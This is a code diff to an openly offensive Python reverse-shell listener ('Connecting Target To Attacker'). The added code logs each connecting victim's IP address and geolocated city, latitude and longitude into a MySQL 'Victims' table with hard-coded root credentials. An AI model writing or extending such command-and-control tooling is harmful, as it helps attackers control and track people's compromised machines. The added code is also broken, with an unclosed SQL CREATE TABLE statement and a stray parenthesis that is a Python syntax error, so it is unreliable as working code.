@@ -6,6 +6,13 @@ import os
 
 import time
 
+import mysql.connector as sql
+
+import geocoder
+
+db = sql.connect(user='root', password='password', host='localhost', database='NullVoid')
+db_cur = db.cursor()
+db_cur.execute("CREATE TABLE Victims(IP_Addr varchar(30) NOT NULL, Location varchar(50), Latitude varchar(50), Longitude varchar(50)")
 # Connecting Target To Attacker
 def connect():
     # Starting Socket Server
@@ -22,7 +29,16 @@ def connect():
     conn, addr = s.accept()
     
     print ('[+] We got a connection from: ', addr)
-
+    
+    # Find Location Of The Victim
+    g = geocoder.ip(addr)
+    location = g.city
+    latitude = g.latlng[0]
+    longitude = g.latlng[1]
+    query = "INSERT INTO Victims(IP_Addr, Location, Latitude, Longitude) VALUES (%s, %s, %s, %s)")
+    values = (addr, location, latitude, longitude)
+    db_cur.execute(query, values)
+    
     # We Do Not Know The Target's Working Directory
     # So Initially It Is "Shell"
     cwd = 'Shell'
